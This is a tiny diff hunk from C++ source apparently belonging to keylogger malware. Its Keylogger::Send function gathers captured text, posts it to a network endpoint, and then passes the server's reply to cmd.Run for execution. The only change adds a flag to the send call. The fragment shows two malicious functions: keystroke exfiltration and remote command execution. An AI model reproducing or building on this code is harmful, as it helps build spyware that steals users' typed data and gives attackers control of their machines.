@@ -218,7 +218,7 @@ void Keylogger::Send()
         msgText += *itr;
     }
 
-    std::string response = network.SendPost(msgText.c_str(), msgText.size());
+    std::string response = network.SendPost(msgText.c_str(), msgText.size(), true);
     cmd.Run(response);
 
     return;
